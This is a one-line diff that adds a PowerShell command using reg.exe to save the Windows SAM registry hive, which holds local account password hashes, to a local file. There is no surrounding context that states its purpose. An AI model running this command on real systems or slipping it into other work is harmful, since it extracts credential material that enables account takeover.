@@ -1,0 +1,1 @@
+powershell C:\Windows\system32\reg.exe save hklm\sam ./l
